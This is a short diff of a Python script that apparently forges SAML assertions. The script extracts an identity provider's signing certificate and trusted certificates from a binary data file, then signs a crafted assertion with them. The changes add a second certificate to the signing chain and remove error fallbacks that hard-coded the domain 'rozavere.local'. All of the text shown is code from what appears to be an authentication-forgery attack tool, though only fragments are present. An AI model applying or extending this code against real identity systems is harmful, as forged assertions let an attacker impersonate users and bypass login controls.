@@ -278,7 +278,7 @@ def sign_assertion(root, cert1, cert2, key):
         print('[*] Signing the SAML assertion')
         assertion_id = root.find("{urn:oasis:names:tc:SAML:2.0:assertion}Assertion").get("ID")
         signer = XMLSigner(c14n_algorithm="http://www.w3.org/2001/10/xml-exc-c14n#")
-        signed_assertion = signer.sign(root, reference_uri=assertion_id, key=key, cert=[cert2])
+        signed_assertion = signer.sign(root, reference_uri=assertion_id, key=key, cert=[cert1, cert2])
         return signed_assertion
     except:
         print('[-] Failed signing the SAML assertion')
@@ -339,16 +339,9 @@ if __name__ == '__main__':
     in_stream = open(args.path, 'rb')
     bin_stream = bitstring.ConstBitStream(in_stream)
     idp_cert = get_idp_cert(bin_stream, args.verbose)
-    try:
-        trusted_cert_1, domain = get_trusted_cert1(bin_stream, args.verbose)
-    except:
-        print('failed cert1')
-        domain = 'rozavere.local'
-        trusted_cert_1 = ''
-    try:
-        trusted_cert_2 = get_trusted_cert2(bin_stream, args.verbose)
-    except:
-        print('failed cert1')
+    trusted_cert_1, domain = get_trusted_cert1(bin_stream, args.verbose)
+    trusted_cert_2 = get_trusted_cert2(bin_stream, args.verbose)
+    
 
 
     # Generate SAML request
